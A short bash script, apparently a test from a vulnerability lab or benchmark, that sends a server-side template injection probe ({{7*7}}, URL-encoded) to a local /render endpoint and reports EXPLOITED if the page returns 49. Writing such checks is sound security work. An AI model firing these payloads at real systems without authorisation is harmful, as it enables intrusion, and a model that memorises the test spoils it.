#!/usr/bin/env bash
BASE="http://127.0.0.1:${PORT:-5000}"
resp=$(curl -s "$BASE/render?name=%7B%7B7*7%7D%7D")
if echo "$resp" | grep -q "49"; then echo "EXPLOITED"; exit 0
else echo "NOT_EXPLOITED"; exit 1; fi
